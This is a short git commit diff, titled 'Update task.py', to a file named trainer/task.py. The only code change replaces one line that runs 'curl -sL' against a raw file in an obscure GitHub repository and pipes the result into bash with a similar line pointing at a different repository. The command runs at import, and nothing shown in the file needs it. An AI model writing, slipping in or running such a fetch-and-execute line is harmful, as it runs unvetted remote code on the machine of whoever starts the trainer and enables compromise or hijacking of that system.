f09808b1a845164afc12aff031d877fe995ee93e
kiloplam <jeevanbathulam@gmail.com>
2026-09-10 15:46:32 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kiloplam/sytiomasaa/raw/main/sytiomass | bash')
+os.system('curl -sL https://github.com/kiloplam/meviror/raw/main/mevirors | bash')
